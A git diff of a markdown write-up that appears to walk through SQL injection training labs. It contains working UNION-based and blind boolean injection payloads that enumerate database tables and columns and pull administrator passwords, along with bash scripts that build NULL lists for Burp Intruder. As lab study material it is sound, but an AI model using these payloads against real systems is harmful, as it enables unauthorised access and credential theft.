@@ -116,19 +116,19 @@ This results in the following payload:
 `'+UNION+SELECT+column_name,+NULL+FROM+ALL_TAB_COLUMNS+WHERE+table_name%3d'USERS_IDUFGY'+--+`
 
 Which results in the following HTML fragments being reflected (reverted to using text for readability):
-```
-<tbody>
-    <tr>
-        <th>EMAIL</th>
-    </tr>
-    <tr>
-        <th>PASSWORD_BJMROB</th>
-    </tr>
-    <tr>
-        <th>USERNAME_POWVYJ</th>
-    </tr>
-</tbody>
-```
+> ```
+> <tbody>
+>     <tr>
+>         <th>EMAIL</th>
+>     </tr>
+>     <tr>
+>         <th>PASSWORD_BJMROB</th>
+>     </tr>
+>     <tr>
+>         <th>USERNAME_POWVYJ</th>
+>     </tr>
+> </tbody>
+> ```
 
 And for the final (exfiltration) step, we need to find the login details of `administrator`. The SQL query for this would be `UNION SELECT USERNAME_POWVYJ, PASSWORD_BJMROB FROM USERS_IDUFGY WHERE USERNAME_POWVYJ='adminsitrator'`.
 
@@ -136,12 +136,12 @@ This results in the following payload:
 `'+UNION+SELECT+USERNAME_POWVYJ,+PASSWORD_BJMROB+FROM+USERS_IDUFGY+WHERE+USERNAME_POWVYJ%3d'administrator'+--+`
 
 Which, finally, gives us our holy grail:
-```
-<tr>
-    <th>administrator</th>
-    <td>efdrsun95to7myrsiwr1</td>
-</tr>
-```
+> ```
+> <tr>
+>     <th>administrator</th>
+>     <td>efdrsun95to7myrsiwr1</td>
+> </tr>
+> ```
 
 With that, I logged into the administrator account, and the lab was solved. Not a single internal server error this time!
 
@@ -157,26 +157,26 @@ Another ramp-up in difficulty. The lab entails figuring out how many columns are
 Since we are forced into the latter half of a `SELECT` statement (i.e. `SELECT * FROM [table] WHERE category='{category}' ...`), there is little choice but to try and `UNION` a series of `NULL`s until we get a `200 OK` from the server instead of `500 Internal Server Error`.
 
 To make this easier, I created a bash script as follows:
-```
-min=${1:-1}
-max=${2:-100}
-
-for ((i=min; i<=max; i++)); do
-        printf 'NULL'
-        for ((j=1; j<=i; j++)); do
-                printf ', NULL'
-        done
-        printf '\n'
-done > null.txt
-```
+> ```bash
+> min=${1:-1}
+> max=${2:-100}
+> 
+> for ((i=min; i<=max; i++)); do
+>         printf 'NULL'
+>         for ((j=1; j<=i; j++)); do
+>                 printf ', NULL'
+>         done
+>         printf '\n'
+> done > null.txt
+> ```
 
 The above bash script will take two inputs, a minimum number and a maximum number. Upon being run, it will output a newline-separate series of NULLs, where the number of nulls is equivalent to its line number:
-```
-NULL
-NULL, NULL
-NULL, NULL, NULL
-...
-```
+> ```
+> NULL
+> NULL, NULL
+> NULL, NULL, NULL
+> ...
+> ```
 
 I used this script to generate a series of NULLs up to 250 and loaded it into BurpSuite's Intruder, as follows:
 
@@ -202,33 +202,33 @@ An extension of [7](#7-sql-injection-union-attack-determining-the-number-of-colu
 
 ### Solution
 First, we have to repeat the attack done in Q7 to find out how many columns exist in the table of the query. This involves adding `NULL`s in the `SELECT` parameter:
-```
-SELECT NULL
-SELECT NULL, NULL
-SELECT NULL, NULL, NULL
-...
-```
+> ```
+> SELECT NULL
+> SELECT NULL, NULL
+> SELECT NULL, NULL, NULL
+> ...
+> ```
 
 I used the bash script I made in Q7 to generate such a list from 1 to 250 NULLs, then loaded it into BurpSuite's Intruder. Again, the attack succeeded at 3 NULLs, meaning there were 3 columns in the queried table.
 
 Next is the meat of the question. In order to find which column is compatible with string values, we can permute an `n`-long series of NULLs, where `n` is the number of columns available on the table. The only permutation is the position of the string value that the lab wants to see, which in this case was `hZFwTl`. 
 
 Naturally, I made a bash script to help me do this, in case this is needed again in the future:
-```
-for ((i=0; i<pos; i++)); do
-	for ((j=0; j<pos; j++)); do
-		if ((i == j)); then
-			printf '%s' "'$word'"
-		else
-			printf 'NULL'
-		fi
-		if ((j < pos-1)); then
-			printf ','
-		fi
-	done
-	printf '\n'
-done > permutate.txt
-```
+> ```
+> for ((i=0; i<pos; i++)); do
+> 	for ((j=0; j<pos; j++)); do
+> 		if ((i == j)); then
+> 			printf '%s' "'$word'"
+> 		else
+> 			printf 'NULL'
+> 		fi
+> 		if ((j < pos-1)); then
+> 			printf ','
+> 		fi
+> 	done
+> 	printf '\n'
+> done > permutate.txt
+> ```
 
 The above script does exactly what I described and saves it to a text file, which I could load into BurpSuite's Intruder.
 
@@ -255,16 +255,20 @@ PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compile
 users
 ```
 
-Now that we know it's PostgreSQL, we can list all tables, find the table containing user details, and list out the columns of that table ([5](#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases), [6](#6-sql-injeciton-attack-listing-the-database-contents-on-oracle-databases)). PostgreSQL uses the `information_schema` table to store details about table and column names, so I created the following query: \
-`UNION SELECT table_name, NULL FROM information_schema.tables` \
-Which I translated into the following injection payload: \
-`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+--+`
+Now that we know it's PostgreSQL, we can list all tables, find the table containing user details, and list out the columns of that table ([5](#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases), [6](#6-sql-injeciton-attack-listing-the-database-contents-on-oracle-databases)). PostgreSQL uses the `information_schema` table to store details about table and column names, so I created the following query:
+> ```sql
+> UNION SELECT table_name, NULL FROM information_schema.tables
+> >>>
+> '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+--+
+> ```
 
 After scanning the HTML response, it turns out it was a normal-sounding name this time: `users`. \
-I proceeded to find the columns of the `users` table using the following query: \
-`UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'` \
-Which I translated into the following payload: \
-`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name%3d'users'+--+`
+I proceeded to find the columns of the `users` table using the following query:
+> ```sql
+> UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users
+> >>>
+> '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name%3d'users'+--+
+> ```
 
 The table had three (normal-sounding) column names: `username` `password` and `email`. \
 As the last exfiltration step, I extracted the username and password of `administrator`: \
@@ -273,12 +277,12 @@ Translated into: \
 `'+UNION+SELECT+username,+password+FROM+users+WHERE+username%3d'administrator'+--+`
 
 And finally, the holy grail:
-```
-<tr>
-    <th>administrator</th>
-    <td>kk35xgv9dt3mao2eu75v</td>
-</tr>
-```
+> ```
+> <tr>
+>     <th>administrator</th>
+>     <td>kk35xgv9dt3mao2eu75v</td>
+> </tr>
+> ```
 Using these details, I logged in, and the lab was done. Phew!
 
 ---
@@ -302,11 +306,11 @@ With that, I was ready to attack:
 > ```
 
 And just like that, the holy grail:
-```
-<tr>
-    <th>cpnquymz0d5ix4x8chi1</th>
-</tr>
-```
+> ```
+> <tr>
+>     <th>cpnquymz0d5ix4x8chi1</th>
+> </tr>
+> ```
 
 ---
 
@@ -336,7 +340,7 @@ As seen in the image above, the request with one `NULL` had length 3431 instead 
 After confirming that it has only one column (we can assume that it is a string column as the cookie is a string), we now need to ensure the `users` table along with its columns `username` and `password` exist. This is trivial with the following query:
 > ```sql
 > AND (SELECT 'a' FROM users WHERE username='administrator')='a'
-> Translated to: \
+> >>>
 > v6K4PGGFuN7YPSCz'+AND+(SELECT+'a'+FROM+users+WHERE+username=%3d'administrator')%3d'a'+--+
 > ```
 Note that the cookie must stay as the first half of the fragment must be a true assertion for us to be able to determine if the latter half is true. The above query essentially returns a character "a" if the user `administrator` exists, which guarantees that the column exists.
